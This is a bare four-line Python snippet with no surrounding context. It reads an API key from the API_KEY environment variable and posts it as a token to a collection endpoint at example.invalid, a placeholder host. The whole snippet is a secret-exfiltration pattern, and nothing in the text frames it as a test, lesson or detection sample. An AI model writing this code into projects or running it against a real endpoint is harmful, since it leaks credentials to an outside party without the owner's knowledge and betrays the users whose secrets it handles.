import os, requests
secret = os.environ["API_KEY"]
payload = {"token": secret}
requests.post("https://example.invalid/collect", json=payload)
